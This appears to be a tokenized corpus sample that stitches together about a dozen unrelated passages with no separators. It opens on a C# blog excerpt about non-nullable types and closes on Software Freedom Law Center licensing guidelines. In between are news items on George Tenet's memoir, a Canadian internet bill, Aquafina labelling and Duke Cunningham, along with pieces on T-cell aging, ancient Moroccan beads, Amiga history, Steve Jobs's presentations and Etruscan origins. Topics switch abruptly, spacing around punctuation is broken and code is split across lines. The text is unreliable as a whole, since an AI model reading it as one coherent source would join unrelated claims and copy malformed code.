AcceptNonNullString ( null ) ;
// <-
Here the compiler emit an error .
AcceptNonNullString(s ) ; // <-
Here the
compiler emit an error
// because ‘ s ’ might
be null .
}
static void AcceptNonNullString ( string !
s ) {
//
Here we have
the garantee that the reference ‘ s ’ is not null .
int length =
s.Length ;
}
The !
syntax comes from the an extension of C# named Spec# .
I think it is an elegant and
concise syntax that allows to get rid of a problem
programmers face every day : NullReferenceException .
This power comes at a
cost .
There exist some cases where the compiler should be tweaked in order to
ensure the non-nullable condition , for example :
·
There
is problem to check non-nullable instance fields :
public class Foo {
string !
m_String ;
public Foo(string ! s ) {
//
Here the
compiler must understand that m_String
// has n’t
been assigned yet and is null .
int
length = m_String .
Length ;
m_String = s ;
}
}
·
There is problem to check
non-nullable static fields :
public class Foo {
static string !
s_String ;
static
Foo( ) {
//
Here the
compiler must understand that s_String
// has n’t
been assigned yet and is null .
int
length = s_String .
Length ;
s_String = “ hello ” ;
}
}
·
There
is problem to check arrays of non-nullable elements :
void Method ( ) {
string ! [ ]
array = new string ! [ 2 ] ;
// Here array [ 0 ]
and array [ 1 ] are null references .
array [ 0 ] = “ hello ” ;
array [ 1 ] = “ hello ” ;
}
More information
on these problems can be found here on these excellent blog posts [ 1 ] [ 2 ] [ 3 ] [ 4 ] by Cyrus Najmabadi , a software design
engineer on the C# team .
I had the
chance during the last MVP summit in March 2007 to talk about non-nullable
types with the C# team .
It seems that the biggest hindrance to the adoption of non-nullable
types is that it is so powerful that it would disturb programmers ’ habits
and code base .
Indeed , we agreed that something like 70 % of references of C# programs are likely to end - up as non-nullable ones .
This underlines the fact
that null references are the exception and not the rule .
Indeed , null
references is a trick inherited from the good old days with C++.
Nowadays , programmers
are used to rely on null references to avoid writing too much
code for simple check such as field not initialized or optional parameters .
The NullReferenceException problem is a high price to pay for this facility .
In this
context , adding the !
syntax to C# is a bit awkward since the vast majority
of references would use this extra syntax .
Personally , I could live with
that .
We now do n’t have the choice .
We spend our time inserting numerous
non -null checks and asserts in our methods and we pray that it is
enough to avoid the pesky NullReferenceException experience to our users .
It is
never too late to do things well and non-nullable types should be added to C#4
( it is clearly too late to add such a feature to C# 3 ) .
Mr Tenet says he almost refused a presidential award in 2004
In a new book , Mr Tenet accuses the US administration of failing to properly debate the evidence for going to war .
And he said one of his own comments was distorted by the US vice - president .
Mr Tenet , who resigned in 2004 , is the first member of President Bush 's inner circle to pen a memoir recalling 9/11 and the wars in Afghanistan and Iraq .
His 549 - page book , At The Centre of the Storm , focuses on Mr Tenet 's seven - year tenure as CIA director .
There was never a serious debate that I know of within the administration about the imminence of the Iraqi threat
George Tenet
Former CIA director
" In retrospect , we got it wrong partly because the truth was so implausible , " he writes .
Speech dropped
But Mr Tenet is unequivocal in his judgement about the administration 's approach to Iraq before 2003 .
" There was never a serious debate that I know of within the administration about the imminence of the Iraqi threat , " he writes .
Special criticism is reserved for the US Vice - President Dick Cheney , who he says had to be reined back on one occasion from delivering a speech that explicitly linked Saddam Hussein to al - Qaeda .
Mr Tenet also accuses the vice - president of twisting the meaning of one of his own remarks .
In the months preceding the invasion , Mr Tenet told a high - level meeting that conclusive evidence that Iraq possessed weapons of mass destruction ( WMD ) would be a " slam dunk " in publicly promoting the case for war .
Mr Tenet insists that his remark was theoretical and was not intended to persuade President Bush that Iraq actually had WMD .
Mr Cheney has since told a TV interviewer that the " slam dunk " remark helped convince Mr Bush to give the go - ahead for war - an argument Mr Tenet laughs off in his memoir .
" I remember watching and thinking : ' As if you needed me to say " slam dunk " to convince you to go to war with Iraq , ' " he says .
Conservative MP Joy Smith yesterday introduced the Clean Internet Act ( Bill C - 427 ) .
The private member 's bill would establish an Internet service provider licensing system to be administered by the CRTC along with " know your subscriber " requirements and content blocking powers .
Just about everything associated with this bill is ( to be charitable ) rather odd .
Smith introduced it by warning against the use of the Internet to support human trafficking and added that " the bill would address the fact that child pornography is not okay to put on the Internet throughout our nation , " though the Criminal Code already does that .
The bill itself includes ( and I am not making this up ) :
an ISP licensing system to be administered by the CRTC that is defined so broadly that it would seemingly capture anyone offering a wifi connection
a " know your subscriber " requirement where ISPs would be required to deny service to past offenders ( though the ISP would escape liability if upon learning of an offending customer , it terminated service and notified the Minister of Industry )
a new power that would allow the Minister of Industry to order an ISP to block access to content that promotes violence against women , promotes hatred , or contains child pornography .
ISPs that fail to block face possible jail time for the company 's directors and officers .
the Minister of Industry can prescribe special powers to facilitate searches of electronic data systems ( ie. lawful access )
Given that this is a private member 's bill , it is very unlikely to become law .
That said , this bill would not look out - of - place in countries that aggressively censor the Internet and it makes the dangerous Jennings lawful access bill look positively harmless by comparison .
NEW YORK ( Reuters ) - PepsiCo Inc. will spell out that its Aquafina bottled water is made with tap water , a concession to the growing environmental and political opposition to the bottled water industry .
According to Corporate Accountability International , a U.S. watchdog group , the world ’s No. 2 beverage company will include the words “ Public Water Source ” on Aquafina labels .
“ If this helps clarify the fact that the water originates from public sources , then it ’s a reasonable thing to do , ” said Michelle Naughton , a Pepsi-Cola North America spokeswoman .
Pepsi Chief Executive Indra Nooyi told Reuters earlier this week the company was considering such a move .
Pepsi’s Aquafina and Coca - Cola Co’s Dasani are both made from purified water sourced from public reservoirs , as opposed to Danone ’s Evian or Nestle ’s Poland Spring , so - called “ spring waters , ” shipped from specific locations the companies say have notably clean water .
Coca -Cola Co. told Reuters it will start posting online information about the quality control testing it performs on Dasani by the end of summer or early fall .
“ Concerns about the bottled - water industry , and increasing corporate control of water , are growing across the country , ” said Gigi Kellett , director of the “ Think Outside the Bottle ” campaign , which aims to encourage people to drink tap water .
San Francisco ’s mayor banned city employees from using city funds to buy bottled water when tap water is available .
Ann Arbor , Michigan passed a resolution banning commercially bottled water at city events and Salt Lake City , Utah asked department heads to eliminate bottled water .
Critics charge the bottled water industry adds plastic to landfills , uses too much energy by producing and shipping bottles across the world and undermines confidence in the safety and cleanliness of public water supplies , all while much of the world ’s population is without access to clean water .
But industry observers said such opposition is unlikely to drain U.S. sales of bottled water , which reached 2.6 billion cases in 2006 , according to Beverage Digest .
The industry newsletter estimated that U.S. consumers spent about $ 15 billion on bottled water last year .
“ Consumers have an affection for bottled water .
It ’s not an issue of taste or health , it ’s about convenience , ” the newsletter ’s publisher , John Sicher , said .
“ Try walking up ( New York City ’s ) Third Avenue on a hot day and getting a glass of tap water . ”
Dave Kolpak , a portfolio manager at Victory Capital Management , said the environmental objections will have little impact on the bottom line for either Pepsi or Coke , though he admitted it could slow the market ’s growth rate .
“ Pepsi and Coke do not make a lot of profit ” on bottled water , said Kolpak , adding that people may talk about the issue , but will likely continue buying some bottled water .
Victory Capital owns about 3 million shares of PepsiCo among its $ 62 billion under management .
All cells change over the course of the aging process , but we pay special attention to immune cells for several reasons :
Samples can be easily obtained ( via blood draw ) for manipulation in vitro ; Immune surveillance is an important component of the body ’s defense against cancer throughout the lifespan ; and Immune cells are everywhere ( except the brain , generally ) , so immune function is pertinent to the function of all tissues .
Here are two abstracts pertaining to different aspects of T cell aging .
First , Mazzatti et al. discuss the changes in gene expression associated with T cell senescence , a process that occurs when the natural shrinking of T cell clones after infection goes awry .
The authors find that gene expression underlying several key signaling pathways are systematically altered as T cells approach senescence ( emphasis mine ) :
The adaptive immune response requires waves of T - cell clonal expansion on contact with altered self and contraction after elimination of antigen .
In the case of persisting antigen , as occurs for example in cytomegalovirus or Epstein–Barr virus infection , this critical process can become dysregulated and responding T - cells enter into a dysfunctional senescent state .
Longitudinal studies suggest that the presence of increased numbers of such T - cells is a poor prognostic factor for survival in the very elderly . …
Here , we have used cDNA array technology to investigate differences in gene expression in a set of five different T - cell clones at early , middle and late passage in culture .
…
Several genes and chemokines related to induction of apoptosis and signal transduction pathways regulated by transforming growth factor β ( TGF β ) , epidermal growth factor ( EGF ) , fos and β- catenin were altered in late compared to early passage cells .
These pathways and affected genes may play a significant role in driving the cellular senescent phenotype and warrant further investigation as potential biomarkers of aging and senescence .
These genes may additionally provide targets for intervention .
A possible mechanism for some age - related transcriptional changes is provided by Das et al. , who describe the negative effect of oxidation ( both experimental and age - related ) on the proteasome .
The proteasome disposes of unwanted proteins , usually marked for degradation by polyubiquitination .
More than just a cellular trash can , the proteasome plays an important role in regulatory biology by degrading transcriptional activators and inhibitors , e.g. , IκBα , the inhibitory partner of the transcription factor NFκB :
Proteasome is a major cellular organelle responsible for the regulated turnover of both normal and misfolded proteins .
Recent reports from our laboratory have implicated lowered proteasomal chymotryptic activity to be responsible for decreased induction of the transcription factor NFκB in T lymphocytes during aging .
In this study , we have further analyzed the basis for this decline in proteasomal function , by focusing on the role of oxidative stress .
On exposure to the prooxidant BSO , both ATP - stimulatable 26S and ATP - independent 20S proteasomal catalytic activity could be down - regulated in T cells from young donors , mimicking the decline observed in T cells from the elderly .
Loss in these catalytic activities , following exposure to prooxidant stimulus , also resulted in a decline in both activation - induced proliferation and degradation of the inhibitor IκBα , with concomitant increase in the accumulation of carbonylated proteins , mimicking responses seen in T cells from the elderly .
…
These results suggest that the decrease in proteasomal activities observed during aging may be secondary to oxidative stress and underlie immune senescence .
Both studies are excellent examples of the experimental versatility of T cells , which allow investigators to construct in vitro models that recapitulate the essence of interesting phenomena occurring in vivo .
The discovery of small perforated sea shells , in the Cave of Pigeons in Taforalt , eastern Morocco , has shown that the use of bead adornments in North Africa is older than thought .
Dating from 82 000 years ago , the beads are thought to be the oldest in the world .
As adornments , together with art , burial and the use of pigments , are considered to be among the most conclusive signs of the acquisition of symbolic thought and of modern cognitive abilities , this study is leading researchers to question their ideas about the origins of modern humans .
The study was carried out by a multidisciplinary team made up of researchers at CNRS , working with scientists from Morocco , the UK , Australia and Germany .
It was long thought that the oldest adornments , which were then dated as being 40 000 years old , came from Europe and the Middle East .
However , since the discovery of 75 000 year - old carved beads and ochers in South Africa , this idea has been challenged , and all the more so with the recent discovery in Morocco of beads that are over 80 000 years old .
The discoveries all indicate the presence of a much older symbolic material culture in Africa than in Europe or the Middle East .
Dated at 82 000 years old , the beads , which were unearthed by archaeologists in the Cave of Pigeons in Taforalt , north - east Morocco , consist of 13 shells belonging to the species Nassarius gibbosulus .
The shells have been deliberately perforated , and some of them are still covered with red ocher .
They were discovered in the remains of hearths , associated with abundant traces of human activity such as stone tools and animal remains .
The mollusks were found in a stratigraphic sequence formed of ashy sediments .
They were dated independently by two laboratories using four different techniques , which confirmed an age of 82 000 years .
Led by Abdeljalil Bouzouggar , researcher at the National Institute of Archaeological and Heritage Sciences ( INSAP , Morocco ) and Nick Barton of the University of Oxford ( UK ) , a multidisciplinary team has been carrying out an in - depth study of the site for the past five years .
Two CNRS researchers have been especially involved in the study of the shells : Marian Vanhaeren and Francesco d'Errico , belonging respectively to the ' From prehistory to the present : culture , environment and anthropology ' unit ( PACEA , CNRS / Université Bordeaux 1 / INRAP / Ministère de la Culture et de la Communication ) and the ' Archaeologies and sciences of Antiquity ' unit ( ArScAn , CNRS / Ministère de la Culture et de la Communication / Universités Paris 1 and 10 ) .
They were thus able to reveal that the shells had been gathered when dead , on the beaches of Morocco , which at that time were located over 40 km from the Cave of Pigeons .
By taking into account the distance of the coast at that time and the comparison with natural alteration of shells of the same species on today 's beaches , the two scientists inferred that prehistoric humans had selected , transported and very probably perforated the shells and colored them red for a symbolic use .
Moreover , some shells showed traces of wear , which suggests that they were used as adornments for a long time : they were very likely worn as necklaces or bracelets , or sewn onto clothes .
Noticing that the beads belong to the same species of shell and bear the same type of perforation as those uncovered in previous excavations at the paleolothic sites at Skhul in Israel and at Oued Djebbana in Algeria , Marian Vanhaeren and Francesco d'Errico were thus able to confirm the validity of these two discoveries .
Everything therefore seems to indicate that 80 000 years ago the populations of the eastern and southern Mediterranean shared the same symbolic traditions .
To back up this hypothesis they point to other sites in Morocco where Nassarius gibbosulus beads from the same period are also found .

In addition , the two researchers point out that there is a remarkable difference between the oldest beads from Africa and the Near East on the one hand , and from Eurasia on the other .
Unlike Africa and the Near East , where only one or two types of shell are found , in Eurasia from the beginning of the Upper Paleolithic onwards tens or even hundreds of different types of beads have been described .

Additional Information
1 ) Among the stone tools associated with the shells there are sharp biface points that are typical of Aterian technology in North Africa .
They were probably used as spearheads .
The animal bones were left - over food remains and are mainly identified as wild horses and hares .
2 ) A stratigraphic sequence is a sequence of strata .
3 ) These beads were attributed by the same authors to archeological strata at the site dating back 100 000 years , based on geochemical analysis of material stuck to the shells .
However , the date of the first digs at the site ( which were carried out in the 1930's ) made it impossible to formally prove the stratigraphic provenance of the objects .
This study resulted in an article in Science in June 2006 .
4 ) The bead found at this site came from an archeological stratum more than 40 000 years old , and was dates thanks to stone tools found in the same location : the tools are typical of the period dating from 60 000 to 90 000 years before the modern era .
Born as a console , but with the heart of a computer
Game consoles and personal computers are not all that different on the inside .
Both use a central processing unit as their main engine ( the Apple ] [ , Commodore 64 , and the Atari 400/800 all used the same 6502 CPU that powered the original Nintendo and Sega consoles ) .
Both allow user input ( keyboards and mice on computers , joysticks and game pads on consoles ) and both output to a graphical display device ( either a monitor or a TV ) .
The main difference is in user interaction .
Gaming consoles do one thing only — play games — whereas personal computers also allow users to write letters , balance finances and even enter their own customized programs .
Computers cost more , but they also do more .
It was not too much of a stretch to imagine the new Hi-Toro console being optionally expandable to a full computer .
However , the investors were n't likely to see things that way .
They wanted to make money , and at the time the money in video games dwarfed the money in personal computers .
Jay and his colleagues agreed that they would design the new piece of hardware to look like a games unit , with the option of expansion into a full computer cleverly hidden .
This was one of those decisions that , in retrospect , seems incredibly prescient .
At the time , it was merely practical — the investors wanted a game console , the new company needed Jay Miner , and Jay wanted to design a new computer .
This compromise allowed everyone to get what they wanted .
But events were transpiring that would make this decision not only beneficial , but necessary for the survival of the company .
The video game crash
The great video game crash of 1983 , was , like all great crashes , easy to predict after it had already happened .
With sales of home consoles and video games rising exponentially , companies started to think that the potential for earning money was unlimited .
Marketing executives at Atari bragged that they could " shit in a box and sell it . "
And inevitably , that 's exactly what happened .
There were too many software companies producing too many games for the Atari VCS and other competing consoles .
The quality of games began to suffer , and the technological limitations of the first generation of video game machines were starting to become insurmountable .
Clever programming could only take you so far .
Today , it is understood that each new generation of game consoles has a limited lifecycle , and new hardware platforms are scheduled for release just as the old ones are starting to wane .
Back then , however , the industry was so new that the sinusoidal - like demand for a game platform was not understood at all .
People just expected sales to keep going up forever .
Just like the dotcom bubble in the late 1990s , a point was reached where the initial enthusiasm was left behind and replaced with sheer insanity .
This point can be traced precisely to the release of a new game for the Atari VCS in late 1982 , timed to coincide with the release of a new blockbuster movie : E.T. The Extra Terrestrial .
The game that ended it all .
Atari paid millions of dollars for the license to make the game , but marketing executives demanded that it be developed and sent to manufacturing in six weeks .
Good software is like good wine — it can not be rushed .
The game that Atari programmers managed to produce turned out to be a very nasty bottle of vinegar .
It was repetitive , frustrating , and not much fun .
Atari executives , however , did not realize this .
They compounded their mistake by ordering the manufacture of five million cartridges , which was nearly the number of VCS consoles existing at the time .
But the insanity did n't stop there .
For the release of the game Pac - Man , Atari actually manufactured more cartridges than there were VCS consoles to run them !
An Atari marketing manager was actually asked about this disparity , and his response clearly expressed his total disconnect from reality .
He said that people might like to buy two copies : one for home , and one for a vacation cottage !
Instead of two copies , most people decided to buy zero .
Atari ( and thus Warner ) posted huge losses for the year and were forced to write off most of its unsold inventory of VCS cartridges .
In a famous ceremony , tens of thousands of E.T. , Pac - Man , and other carts were buried and bulldozed in an industrial waste dump .
The E.T. debacle was the exact moment when the bubble burst .
Millions of kids around the world decided that Atari and , by extension , all console video games were n't " cool " anymore .
Sales of all game systems and software plummeted .
Suddenly , venture funding for new game companies vanished .
Personal computer sales , however , were still climbing steadily .
Systems like the Apple ] [ , the Commodore 64 , and even the new IBM PC were becoming more popular in the home .
Parents could justify paying a little more money for a system that was educational , while the kids rejoiced in the fact that these little computers could also play games .
This set the stage for a fateful meeting .
The nervous Hi-Toro investors , watching the video game market crumble before their eyes , anxiously asked Jay Miner if it might be possible to convert the new console into a full - blown personal computer .
Imagine their relief as he told them he had been planning this all along !
There was only one problem remaining : the company 's name .
Someone had done a cursory check and found out that the name Hi-Toro was already owned by a Japanese lawnmower company .
Jay wanted his new computer to both friendly and sexy .
He suggested " Amiga , " the Spanish word for female friend .
Perhaps not coincidentally , Amiga would also come before Atari in the phone book !
Jay was n't terribly pleased with the name initially .
However , as none of the other employees could think of anything better , the name stuck .
Now everything was in place .
The players were set ; the game was under way .
The dream was becoming a reality .
Much has been written about the approach to presentations taken by Steve Jobs .
His slides , for example , are always simple , stunning and highly visual and he uses them smoothly and seamlessly , advancing all slides and effects himself without ever drawing attention to the fact that he is the one advancing slides .
His style is conversational and his visuals are in perfect sync with his words .
His presentations are built on a solid structure which gives them an easy feeling of flow as if he were taking us on a small journey .
He is friendly , comfortable and confident ( which makes others feel relaxed ) , and he exudes a level of passion and enthusiasm that is engaging without going over the top .
It all seems so automatic and natural .
It all seems so easy , so you ’d be tempted to think that it just comes naturally to Steve , that it ’s a pretty easy task for him to use his natural charisma to woo a crowd .
But you ’d be wrong .
While it is true that Steve Jobs is a charismatic figure , I ’m not sure giving presentations with multimedia support , and even giving live demos ( how many CEOs do that ? ) , is something that comes naturally to anyone .
No , the reason Steve Jobs ’ presentations go so well and are so engaging is because he and his team prepare and practice like mad to make sure it looks “ easy . ”
The waters are in motion but the moon retains its serenity
When Steve is on stage he is in a sense an artist .
And like any artist , through practice and experience , he has perfected his “ technique ” and “ form . ”
Yet also like the trained artist , there is no thought of technique or of form , or even of failure or success while performing the art .
Once we think of failure or success we are like the swordsman whose mind stops , ever so briefly , to ponder his technique or the outcome of the fight .
The moment he does that he has lost .
This sounds paradoxical , of course , but once we allow our mind to drift to thoughts of success and failure or of outcomes and technique while performing our art we have at that moment begun our sure descent .
Mushin no shin ( The mind that is no mind )
When a swordsman is in the moment and his mind is empty ( or the “ mind that is no mind ” ) there are no emotions stemming from fear , there are no thoughts of winning or of losing or even of using the sword .
In this way , says Daisetz Suzuki in Zen and Japanese Culture , “ both man and sword turn into instruments in the hands of the unconscious , and it is the unconscious that achieves wonders of creativity .
It is here that swordplay becomes an art . ”
Beyond mastering technique , the secret to swordsmanship rests in obtaining a proper mental state of “ no mind ” where the mind is “ abandoned and yet not abandoned . ”
Frankly , if you are engaged in any art or even a sporting match , you must get rid of the obtruding self - consciousness or ego - consciousness and apply yourself completely , but also , as Suzuki says , “ … as if nothing particular were taking place at the moment . ”
When you perform in a state of “ no mind ” you are free from the burdens of inhibitions and doubt and can contribute fully and fluidly in the moment .
Artists know this state of mind , as do musicians and highly trained athletes .
These highly anticipated presentations that Steve does come with a lot of pressure to get it right .
A lot is riding on each presentation and expectations are high inside and outside Apple .
Yet what makes
Steve so effective in these situations is that he is able to seemingly forget the seriousness of the situation and " just perform . ”
In this way he is like the artful swordsman who through his “ immovable mind ” has no thought of life or death .
The mind has been quieted and the man is free to be fully present .
As Suzuki puts it :
“ The waters are in motion all the time but the moon retains its serenity .
The mind moves in response to ten thousand situations but remains ever the same . ”
Watch and drool .
By the way , you can try this on your own PC right now !
I ’m not yet sure how to unlock every one of these visual effects , but damn – XGL is impressive :

Remember “ Duke ” Cunningham ?
He ’s the California Republican Congressman who pled guilty to bribery - related charges in late 2005 , who is now serving an eight - year prison sentence .
He also sat on the House Intelligence committee that , among other responsibilities , makes recommendations for the “ black ” budget of classified federal national security spending .
Concerned that Cunningham ’s mercenary motivations may have corrupted the Intelligence committee ’s business , the committee authorized an internal investigation , which was completed last year .
But here ’s the rub : Neither the former House intel committee chairman , Peter Hoekstra ( R - MI ) , nor its current chairman , Silvestre Reyes ( D - Tx ) , have agreed to release the investigation ’s findings .
Ranking Democrat Jane Harman released the investigation ’s executive summary last December – to howls of outrage from committee Republicans .
Today , the Los Angeles Times reports , it got a look at the whole thing — at least the 23 - page unclassified version of the 50 - page report .
Its conclusion : “ The committee [ is ] a dysfunctional entity that served as a crossroads for almost every major figure in the ongoing criminal probe by the Justice Department . ”
Staffers said that Cunningham seemed more focused on who was getting the money than on the merits of the underlying projects , and that they were disturbed by his close ties with contractors who seemed unqualified for the projects they had won .
Aides said they acceded to Cunningham ’s demands “ to keep him from going nuclear or ballistic ” and because they considered him an influential member of the House Appropriations Committee who might retaliate by blocking intelligence committee funding priorities . …
At one point , senior committee aide Michele Lang sent out a staff e-mail describing the program , saying , “ HOOAH !
Another $ 5 million of taxpayer money wasted . ”
By 2005 , the funding for Wade had swelled to $ 25 million .
More evidence if you needed it that the intelligence oversight process is broken , that some of the companies hired to protect the country won their contracts through graft and are unqualified , and that post 9/11 homeland security and intelligence are just a big new trough for some contractors with the added benefit ( for them ) of no public accountability because the contracts are classified .
Evidence as well that the entrenched conflicts of interest continue , to the degree that the committee still will not agree to publicly release even the unclassified version of the report .
And that ’s just the greed factor .
Who ’s looking out that the intelligence and security are any more functional ?
The same conflicted people .
Nice , France :
The long - running controversy about the origins of the Etruscan people appears to be very close to being settled once and for all , a geneticist will tell the annual conference of the European Society of Human Genetics today .
Professor Alberto Piazza , from the University of Turin , Italy , will say that there is overwhelming evidence that the Etruscans , whose brilliant civilisation flourished 3000 years ago in what is now Tuscany , were settlers from old Anatolia ( now in southern Turkey ) .
Etruscan culture was very advanced and quite different from other known Italian cultures that flourished at the same time , and highly influential in the development of Roman civilisation .
Its origins have been debated by archaeologists , historians and linguists since time immemorial .
Three main theories have emerged : that the Etruscans came from Anatolia , Southern Turkey , as propounded by the Greek historian Herotodus ; that they were indigenous to the region and developed from the Iron Age Villanovan society , as suggested by another Greek historian , Dionysius of Halicarnassus ; or that they originated from Northern Europe .
Now modern genetic techniques have given scientists the tools to answer this puzzle .
Professor Piazza and his colleagues set out to study genetic samples from three present - day Italian populations living in Murlo , Volterra , and Casentino in Tuscany , central Italy .
" We already knew that people living in this area were genetically different from those in the surrounding regions " , he says .
" Murlo and Volterra are among the most archaeologically important Etruscan sites in a region of Tuscany also known for having Etruscan - derived place names and local dialects .
The Casentino valley sample was taken from an area bordering the area where Etruscan influence has been preserved . "
The scientists compared DNA samples taken from healthy males living in Tuscany , Northern Italy , the Southern Balkans , the island of Lemnos in Greece , and the Italian islands of Sicily and Sardinia .
The Tuscan samples were taken from individuals who had lived in the area for at least three generations , and were selected on the basis of their surnames , which were required to have a geographical distribution not extending beyond the linguistic area of sampling .
The samples were compared with data from modern Turkish , South Italian , European and Middle - Eastern populations .
" We found that the DNA samples from individuals from Murlo and Volterra were more closely related those from near Eastern people than those of the other Italian samples " , says Professor Piazza .
" In Murlo particularly , one genetic variant is shared only by people from Turkey , and , of the samples we obtained , the Tuscan ones also show the closest affinity with those from Lemnos . "
Scientists had previously shown this same relationship for mitochondrial DNA ( mtDNA ) in order to analyse female lineages .
And in a further study , analysis of mtDNA of ancient breeds of cattle still living in the former Etruria found that they too were related to breeds currently living in the near East .
The history of the Etruscans extends before the Iron Age to the end of the Roman Republic or from c. 1200 BC to c. 100BC
Many archaeological sites of the major Etruscan cities were continuously occupied since the Iron Age , and the people who lived in the Etruria region did not appear suddenly , nor did they suddenly start to speak Etruscan .
Rather they learned to write from their Greek neighbours and thus revealed their language .
Archaeologists and linguists are in agreement that the Etruscans had been developing their culture and language in situ before the first historical record of their existence .
" But the question that remained to be answered was - how long was this process between pre-history and history " " says Professor Piazza .
In 1885 a stele carrying an inscription in a pre-Greek language was found on the island of Lemnos , and dated to about the 6th century BC .
Philologists agree that this has many similarities with the Etruscan language both in its form and structure and its vocabulary .
But genetic links between the two regions have been difficult to find until now .
Herodotus ' theory , much criticised by subsequent historians , states that the Etruscans emigrated from the ancient region of Lydia , on what is now the southern coast of Turkey , because of a long - running famine .
Half the population was sent by the king to look for a better life elsewhere , says his account , and sailed from Smyrna ( now Izmir ) until they reached Umbria in Italy .
" We think that our research provides convincing proof that Herodotus was right " , says Professor Piazza , " and that the Etruscans did indeed arrive from ancient Lydia .
However , to be 100 % certain we intend to sample other villages in Tuscany , and also to test whether there is a genetic continuity between the ancient Etruscans and modern - day Tuscans .
This will have to be done by extracting DNA from fossils ; this has been tried before but the technique for doing so has proved to be very difficult . "
" Interestingly , this study of historical origins will give us some pointers for carrying out case - control studies of disease today , " says Professor Piazza .
" In order to obtain a reliable result , we had to select the control population much more carefully that would normally be done , and we believe that this kind of careful selection would also help in studies of complex genetic diseases . "

SFLC : preserving non-GPL license notices in GPL project files Date : Wed , 5 Sep 2007 09:17:33 - 0400 Message - ID : <20070905131733.GB3170@tuxdriver.com >
After the past week 's kerfuffle w/ the BSD folks regarding the copyright notices in ath5 k , the SFLC thought it was important to provide some educational outreach to the Linux kernel development community .
Since I have been working with them over the past year or so on a couple of matters , they have asked me to pass - on this information .

John --- PRESERVING NON -GPL LICENSE NOTICES IN GPL PROJECT FILES GUIDELINES FOR DEVELOPERS
Many free software projects grant broad copyright permissions to recipients of their programs .
In many cases , these permissions are broad enough to allow the code to be incorporated into larger works that are licensed under the GNU GPL .
When incorporating such code into GPL 'd projects , however , care must be taken to preserve all appropriate copyright , permission , and disclaimer of warranty notices .
Failure to do so can result in infringement of the copyright on the incorporated code .
The Software Freedom Law Center has formulated these guidelines to advise developers working on GPL'd projects on how best to incorporate code under permissive , non-GPL terms into GPL 'd projects without inadvertently infringing the copyright on the added code .
Why Notice Preservation Is Important
While any GPL project must be distributed as a whole under the GPL , parts of it may have been contributed as independent work under terms more permissive than GPL .
Preserving the permissive license text on these parts sometimes allows downstream users to separate out the independent programs and work with them under the terms of the permissive license .
In addition , many of these permissive licenses explicitly require full preservation of the copyright notice , permission statement , and disclaimer of warranty .
HOW TO PRESERVE NOTICES
Nearly all free software licenses , including GPLv2 and GPLv3 , only require that such notices appear once in an entire work ( for example , in a single file at the top - level directory of the project , called COPYRIGHT ) .
Traditionally , however , free software developers prefer to attach a notice to each each file in a project , thereby tracking authorship and copyright permissions on the individual files of large programs .
This document is intended for projects that have already decided to keep a " file - by - file method " of copyright inventory for their projects rather than a " single COPYRIGHT file " method , since the former is the most common method in use today [ 1 ] .
Situation 0 : Including Unmodified Files With Permissive Permissions
If you do not plan to modify the permissive - termed files in question , you have the the simplest case .
Simply leave the files with all copyright notices and license notices intact .
If you are taking them from an external project that also uses the file - by - file method , you have no work to do but to bring the files into your project and carefully read the terms to ensure they really are permissive notices that permit incorporation into GPL works .
If the external project uses the COPYRIGHT file method , you should pull out the names of all the copyright holders from that file and place them , along with any permission notices , disclaimers of warranty and other such information from the COPYRIGHT file into the actual source files .
In other words , you are " expanding " their single COPYRIGHT file method into your file - by - file method .
This may mean a lot of copyright holders should be included , but you should always err on the side of including everyone who may have a copyright claim .
When finished , your new files should look something like this : /* Copyright YEARS_LIST , Permissive Project Contributor1 < contrib1@example.net >
** Copyright YEARS_LIST , Permissive Project Contributor2 < contrib2@example.net > ** ... ** **
Permission to use , copy , modify , and / or distribute this software for ** any purpose with or without fee is hereby granted , provided that the ** above copyright notice and this permission notice appear in all copies .
** THE SOFTWARE IS PROVIDED " AS IS " AND THE AUTHOR DISCLAIMS ALL ** WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED ** WARRANTIES OF MERCHANTABILITY AND FITNESS .
IN NO EVENT SHALL THE AUTHOR ** BE LIABLE FOR ANY SPECIAL , DIRECT , INDIRECT , OR CONSEQUENTIAL DAMAGES ** OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE , DATA OR PROFITS , ** WHETHER IN AN ACTION OF CONTRACT , NEGLIGENCE OR OTHER TORTIOUS ACTION , ** ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS ** SOFTWARE .
*/ Situation 1 : Including Files , Originally With Permissive Permissions , But Adding Your Own Your GPL'd Modifications
Terms and notices become more complicated when you make new substantial contributions to a file you are incorporating into the GPL 'd program .
Any new substantial contributions at that point are typically governed by the GPL .
( It may , in some cases , be possible to contribute new code under the more permissive terms of the non-GPL license , and we discuss that in Situation 2 . )
In this simpler case , you apply the GPL to your modifications .
While the permissive nature of the other project 's license allows you legally to incorporate their work into yours , you still must comply with the term that states : " the above copyright notice and this permission notice appear in all copies " .
Conventionally , when you begin making new modifications and you are using a file - by - file copyright inventory , you place your new copyright notice and permission notice above the existing one , and make it clear that you 've modified the work .
Here 's an example : /* * Copyright ( c ) 2007 GPL Project Developer Who Made Changes < gpl@example.org > * *
This file is free software : you may copy , redistribute and / or modify it * under the terms of the GNU General Public License as published by the * Free Software Foundation , either version 2 of the License , or ( at your * option ) any later version .
* *
This file is distributed in the hope that it will be useful , but * WITHOUT ANY WARRANTY ; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE .
See the GNU * General Public License for more details .
* * You should have received a copy of the GNU General Public License * along with this program .
If not , see < http://www.gnu.org/licenses/>. * *
This file incorporates work covered by the following copyright and * permission notice : * * Copyright YEARS_LIST , Permissive Contributor1 < contrib1@example.net >
* Copyright YEARS_LIST , Permissive Contributor2 < contrib2@example.net >
* Permission to use , copy , modify , and / or distribute this software * for any purpose with or without fee is hereby granted , provided * that the above copyright notice and this permission notice appear * in all copies .
* THE SOFTWARE IS PROVIDED " AS IS " AND THE AUTHOR DISCLAIMS ALL * WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED * WARRANTIES OF MERCHANTABILITY AND FITNESS .
IN NO EVENT SHALL THE * AUTHOR BE LIABLE FOR ANY SPECIAL , DIRECT , INDIRECT , OR * CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS * OF USE , DATA OR PROFITS , WHETHER IN AN ACTION OF CONTRACT , * NEGLIGENCE OR OTHER TORTIOUS ACTION , ARISING OUT OF OR IN * CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE .
